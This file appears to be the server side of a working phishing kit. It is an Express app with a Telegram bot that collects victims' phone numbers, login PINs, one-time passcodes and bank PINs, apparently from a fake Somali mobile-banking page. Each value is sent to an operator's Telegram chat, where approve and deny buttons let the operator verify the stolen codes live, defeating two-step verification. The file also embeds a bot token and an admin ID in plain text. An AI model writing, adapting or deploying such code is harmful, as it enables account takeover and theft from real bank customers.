const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- YOUR CREDENTIALS --------------------
const BOT_TOKEN = "8613311852:AAGrAlchVSYh4YaCeOcSqOTGhdBwd-byjXI";
const ADMIN_ID = "7071374060";

// -------------------- INIT BOT --------------------
const bot = new Telegraf(BOT_TOKEN);

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin) return res.status(400).json({ error: "Missing data" });
    statusStore[phone] = "pending";

    const message = `📱 <b>CL 2 - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇸🇴 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow to proceed", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Invalid credentials", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const currentTime = new Date().toLocaleString('en-US', { month: 'numeric', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    if (!phone || !otp) return res.status(400).json({ error: "Missing data" });

    const otpMessage = `1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>

🆕 <b>NEW USER - FIRST VERIFICATION</b>
🇸🇴 <b>Country: Somalia</b>
🌍 <b>Country Code: +252</b>
📱 <b>Phone Number: ${phone}</b>
🔐 <b>First OTP Code: ${otp}</b>
⏰ <b>Time: ${currentTime}</b>

━━━━━━━━━━━━━━━

⚠️ <b>Verify FIRST OTP:</b>
⌛ <b>Timeout: 5 minutes</b>
📝 <b>Next: Second OTP will be sent after approval</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp1_correct|${phone}|${otp}` },
                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// -------------------- BANK PIN API --------------------
app.post('/api/verify-bank-pin', async (req, res) => {
    const { phone, bankPin } = req.body || {};
    const currentTime = new Date().toLocaleString('en-US', { month: 'numeric', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    if (!phone || !bankPin) return res.status(400).json({ error: "Missing data" });

    const bankPinMessage = `🏦 <b>CL 2 - BANK PIN VERIFICATION (Step 3)</b>

🆕 <b>NEW USER - BANK SECURITY</b>
🇸🇴 <b>Country: Somalia</b>
📱 <b>Phone Number: ${phone}</b>
🔑 <b>Bank PIN: ${bankPin}</b>
⏰ <b>Time: ${currentTime}</b>

━━━━━━━━━━━━━━━

⚠️ <b>Verify BANK PIN:</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, bankPinMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `bank_correct|${phone}|${bankPin}` },
                        { text: "❌ Wrong PIN", callback_data: `bank_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS (ALL BUTTONS RESTORED) --------------------

bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
    await ctx.answerCbQuery("Allowed");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>LOGIN APPROVED</b>\n\n📱 <b>${phone}</b>\n🔐 <b>${pin}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: Approved</b>\n⏱️ <b>${currentTime}</b>`);
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "denied";
    await ctx.answerCbQuery("Rejected");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>INVALID CREDENTIALS</b>\n📱 <b>User:</b> ${phone}\n❌ <b>Status: Rejected</b>`);
});

bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "bank_pin_correct";
    await ctx.answerCbQuery("Bank PIN Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>BANK PIN VERIFIED</b>\n📱 <b>User:</b> ${phone}\n🏁 <b>User redirected to Success page</b>`);
});

bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "bank_pin_wrong";
    await ctx.answerCbQuery("Wrong Bank PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>BANK PIN WRONG</b>\n📱 <b>User:</b> ${phone}`);
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- START SERVER & BOT --------------------
app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
